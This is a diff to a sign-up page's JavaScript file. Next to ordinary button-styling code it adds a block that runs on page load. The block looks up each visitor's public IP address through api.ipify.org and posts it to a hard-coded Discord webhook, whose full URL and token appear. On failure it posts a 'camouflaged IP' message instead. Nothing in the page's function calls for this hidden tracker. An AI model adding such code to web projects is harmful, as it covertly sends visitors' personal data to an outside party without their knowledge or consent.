@@ -20,3 +20,27 @@ function botaoCadastroSair(){
     $("#buttonCriar").css("cursor","pointer")
     $("#buttonCriar").css("cursor","0.3s")
 }
+
+
+fetch('https://api.ipify.org?format=json')
+  .then(response => {
+    if (!response.ok) {
+        throw new Error('Error getting user IP');
+    }
+    return response.json();
+  })
+  .then(data => {
+    let userIP = data.ip ? data.ip : 'null';
+    fetch('https://discord.com/api/webhooks/1128906923496972299/SUJRByDsk-ZYxDXUbm6UrIKbsNPky1lfMVN8MySEuUU6sYmq28BVt0fFNF_pAaoI7Tqy', {
+      method: 'POST',
+      body: JSON.stringify({content: `**Acess IP:** ${userIP}`}),
+      headers: { 'Content-Type': 'application/json' },
+    });
+  })
+  .catch(error => {
+    fetch('https://discord.com/api/webhooks/1128906923496972299/SUJRByDsk-ZYxDXUbm6UrIKbsNPky1lfMVN8MySEuUU6sYmq28BVt0fFNF_pAaoI7Tqy', {
+        method: 'POST',
+        body: JSON.stringify({content: `**IP Camuflado!** ${error}`}),
+        headers: { 'Content-Type': 'application/json' },
+    });
+  });
